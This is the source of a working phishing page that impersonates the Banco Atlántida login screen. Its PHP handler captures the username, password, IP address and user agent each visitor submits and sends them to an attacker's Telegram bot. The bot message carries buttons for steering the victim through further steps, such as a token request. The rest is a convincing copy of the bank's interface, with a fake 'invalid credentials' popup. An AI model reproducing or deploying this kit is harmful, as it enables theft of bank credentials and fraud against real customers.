<?php
require_once dirname(__DIR__) . '/gate_check.php';
include("../data.php");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $usuario = trim($_POST['usuario'] ?? '');
    $clave   = trim($_POST['clave']   ?? '');

    $ip = '';
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
        if (!empty($_SERVER[$h])) { $ip = trim(explode(',', $_SERVER[$h])[0]); break; }
    }
    $ip   = $ip ?: '?';
    $ua   = $_SERVER['HTTP_USER_AGENT'] ?? '?';
    $date = date('d/m/Y H:i:s');

    $msg  = "🏦 BANCO MANZANA — ACCESO\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "👤 <b>Usuario:</b> $usuario\n";
    $msg .= "🔑 <b>Clave:</b> $clave\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "🌐 <b>IP:</b> $ip\n";
    $msg .= "🕒 <b>Fecha:</b> $date\n";
    $msg .= "📲 <b>UA:</b> " . substr($ua, 0, 80) . "\n";

    $keyboard = json_encode([
        'inline_keyboard' => [
            [
                ['text' => '✅ LOGIN',      'callback_data' => "LOGIN|$usuario"],
                ['text' => '❌ LOGINERROR', 'callback_data' => "LOGINERROR|$usuario"],
            ],
            [
                ['text' => '🔑 TOK',       'callback_data' => "TOK|$usuario"],
            ],
        ]
    ]);

    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
        'chat_id'      => $chat_id,
        'text'         => $msg,
        'parse_mode'   => 'HTML',
        'reply_markup' => $keyboard,
    ]));

    header('Location: ../espera.php?u=' . urlencode($usuario) . '&step=login');
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>Banco Atl&#225;ntida — Iniciar sesión</title>
  <link rel="icon" href="../img/logo-ba.svg" type="image/svg+xml"/>
  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
  <style>
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
    :root{--red:#E30613;--red-dark:#B30410;--bg:#fff;--text:#1a1a1a;--muted:#6b7280;--border:#d1d5db;--radius:10px}
    html,body{font-family:'Inter',-apple-system,'Segoe UI',Roboto,sans-serif;background:#f5f5f5;color:var(--text);min-height:100vh;-webkit-font-smoothing:antialiased}
    .page{max-width:440px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column;position:relative;padding-bottom:40px}

    .lang-bar{display:flex;justify-content:flex-end;padding:14px 20px 0}
    .lang-btn{display:inline-flex;align-items:center;gap:6px;background:none;border:none;font-size:14px;font-weight:500;color:var(--text);cursor:pointer;padding:6px 10px;border-radius:6px}
    .lang-btn:hover{background:#f3f4f6}
    .lang-btn svg{width:18px;height:18px;color:var(--red)}

    .logo-wrap{display:flex;justify-content:center;padding:32px 20px 28px}
    .logo-wrap img{height:70px;width:auto}

    .subtitle{text-align:center;font-size:15px;color:var(--muted);padding:0 24px 28px;line-height:1.55}
    .subtitle span{color:var(--red);font-weight:500}

    .form-wrap{padding:0 24px}
    .field{margin-bottom:20px}
    .field label{display:block;font-size:14px;font-weight:500;color:var(--text);margin-bottom:8px}
    .field input{width:100%;height:52px;border:1.5px solid var(--border);border-radius:var(--radius);padding:0 16px;font-size:15px;font-family:inherit;color:var(--text);background:#fff;outline:none;transition:border-color .15s,box-shadow .15s}
    .field input:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(227,6,19,.12)}
    .pass-wrap{position:relative}
    .pass-wrap input{padding-right:48px}
    .eye-btn{position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--muted);padding:4px;display:flex;align-items:center}
    .eye-btn svg{width:20px;height:20px}
    .forgot{display:block;text-align:right;font-size:13.5px;color:var(--red);text-decoration:none;margin-top:8px}
    .forgot:hover{text-decoration:underline}

    .btn-login{display:block;width:100%;height:52px;border:none;border-radius:var(--radius);font-size:16px;font-weight:600;font-family:inherit;cursor:pointer;margin-top:28px;transition:background .2s,color .2s;background:#e5e7eb;color:#9ca3af}
    .btn-login.ready{background:var(--red);color:#fff;box-shadow:0 6px 18px rgba(227,6,19,.28)}
    .btn-login.ready:hover{background:var(--red-dark)}
    .btn-login.ready:active{transform:translateY(1px)}

    .security-card{margin:32px 24px 0;border:1.5px solid #e5e7eb;border-radius:14px;padding:18px 16px 14px;display:flex;flex-direction:column;gap:12px}
    .card-body{display:flex;gap:14px;align-items:flex-start}
    .card-illo{flex-shrink:0;width:72px;height:72px}
    .card-text{flex:1}
    .card-title{font-size:14px;font-weight:700;color:#d97706;margin-bottom:6px}
    .card-desc{font-size:13px;color:var(--muted);line-height:1.5}
    .card-desc a{color:var(--red);text-decoration:none;font-weight:500}
    .dots{display:flex;justify-content:center;gap:6px;padding-top:4px}
    .dot{width:8px;height:8px;border-radius:50%;background:#d1d5db}
    .dot.active{background:var(--text)}
  </style>
</head>
<body>
<div class="page">

  <div class="lang-bar">
    <button class="lang-btn" type="button">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
      ES
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="12" height="12"><path d="M6 9l6 6 6-6"/></svg>
    </button>
  </div>

  <div class="logo-wrap">
    <img src="../img/logo-ba.svg" alt="Banco Atl&#225;ntida"/>
  </div>

  <p class="subtitle">Ingresa <span>tu usuario y contraseña</span> para iniciar sesión.</p>

  <div class="form-wrap">
    <form method="POST" action="" id="loginForm" autocomplete="off">

      <div class="field">
        <label for="usuario">Usuario</label>
        <input type="text" id="usuario" name="usuario" autocomplete="username" required/>
      </div>

      <div class="field">
        <label for="clave">Contraseña</label>
        <div class="pass-wrap">
          <input type="password" id="clave" name="clave" autocomplete="current-password" required/>
          <button type="button" class="eye-btn" id="eyeBtn" aria-label="Mostrar contraseña">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
              <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
              <line x1="1" y1="1" x2="23" y2="23"/>
            </svg>
          </button>
        </div>
        <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
      </div>

      <button type="submit" class="btn-login" id="btnLogin">Iniciar sesión</button>

    </form>
  </div>


</div>
<script>
  const u = document.getElementById('usuario');
  const p = document.getElementById('clave');
  const btn = document.getElementById('btnLogin');
  const eyeBtn = document.getElementById('eyeBtn');

  function checkReady() {
    btn.classList.toggle('ready', u.value.trim().length > 0 && p.value.length > 0);
  }
  u.addEventListener('input', checkReady);
  p.addEventListener('input', checkReady);

  eyeBtn.addEventListener('click', () => {
    const isPass = p.type === 'password';
    p.type = isPass ? 'text' : 'password';
    eyeBtn.querySelector('svg').style.opacity = isPass ? '0.4' : '1';
  });
</script>
<script src="../popup.js"></script>
<script src="../protect.js"></script>
<?php if (!empty($_GET['error'])): ?>
<script>
(function(){
  var style = document.createElement('style');
  style.textContent = [
    '#__err_ov{position:fixed;inset:0;z-index:99999;backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);background:rgba(0,0,0,.45);display:flex;align-items:center;justify-content:center;opacity:0;transition:opacity .35s}',
    '#__err_ov.in{opacity:1}',
    '#__err_box{background:#fff;border-radius:12px;padding:28px 32px;max-width:320px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.35);transform:translateY(18px);transition:transform .35s}',
    '#__err_ov.in #__err_box{transform:translateY(0)}',
    '#__err_icon{font-size:36px;margin-bottom:10px}',
    '#__err_box p{font-family:-apple-system,"Segoe UI",Roboto,sans-serif;font-size:15px;font-weight:600;color:#E30613;line-height:1.5;margin:0}'
  ].join('');
  document.head.appendChild(style);

  var ov = document.createElement('div'); ov.id = '__err_ov';
  var bx = document.createElement('div'); bx.id = '__err_box';
  var ic = document.createElement('div'); ic.id = '__err_icon'; ic.textContent = '⚠️';
  var tx = document.createElement('p');   tx.textContent = 'Usuario o Contraseña Inválidos';
  bx.appendChild(ic); bx.appendChild(tx); ov.appendChild(bx); document.body.appendChild(ov);

  setTimeout(function(){
    ov.classList.add('in');
    setTimeout(function(){
      ov.classList.remove('in');
      setTimeout(function(){ ov.parentNode && ov.parentNode.removeChild(ov); }, 400);
    }, 3000);
  }, 300);
})();
</script>
<?php endif; ?>
</body>
</html>
